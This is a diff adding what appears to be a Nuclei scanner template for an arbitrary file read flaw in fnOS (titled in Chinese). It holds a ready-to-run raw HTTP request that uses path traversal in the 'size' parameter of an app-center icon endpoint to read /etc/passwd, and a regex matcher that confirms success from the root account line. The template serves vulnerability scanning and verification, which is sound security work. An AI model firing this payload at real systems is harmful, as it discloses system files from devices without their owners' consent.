@@ -1,0 +1,22 @@
+id: fnOS-myapp-fileread
+
+info:
+  name: 飞牛fnOS存在任意文件读取漏洞
+  author: fnOS
+  severity: high
+  tags: fnOS
+
+http:
+  - raw:
+      - |+
+        GET /app-center-static/serviceicon/myapp/%7B0%7D/?size=../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
+        Connection: close
+
+    matchers:
+      - type: regex
+        # name: linux
+        part: body
+        regex:
+          - 'root:.*?:[0-9]*:[0-9]*:'
